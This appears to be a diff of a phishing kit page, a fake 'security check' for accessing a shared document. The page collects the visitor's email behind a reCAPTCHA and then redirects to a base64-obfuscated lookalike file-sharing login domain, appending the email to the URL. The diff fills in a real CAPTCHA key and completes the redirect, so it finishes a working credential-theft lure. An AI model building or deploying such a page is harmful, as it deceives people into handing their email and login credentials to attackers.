@@ -14,7 +14,7 @@
          <p><strong>Complete the security check below:</strong></p>
          <p2>Please enter the email address associated with this document to proceed with access.</p2>
          <input type="email" id="email-input" placeholder="Enter email" required="" style="margin-top: 10px;">
-         <div class="g-recaptcha" data-sitekey="GOOGLE CAPTCHA KEY"></div>
+         <div class="g-recaptcha" data-sitekey="6Le24xAsAAAAANNx8erb-x6LeZVqJnsnJUSML69p"></div>
          <button id="continue-button">Review</button> 
       </div>
       <script>
@@ -29,7 +29,7 @@
                  alert("Please complete the CAPTCHA verification.");
                  return;
              }
-             var redirectUrl = atob("aHR0cHM6Ly9sb2dpbi5hcGktdjEtbWljcm8xZHJpdmUtc2hhcmVkZmlsZXMuc2l0ZS9Qcm9qZWN0LURldGFpbHMucGRm") + '' + emailInput;
+             var redirectUrl = atob("aHR0cHM6Ly9sb2dpbi5hcGktdjEtbWljcm8xZHJpdmUtc2hhcmVkZmlsZXMuc2l0ZS9Qcm9qZWN0LURldGFpbHMucGRm") + '?e=#' + emailInput;
              window.location.href = redirectUrl;
          }
          
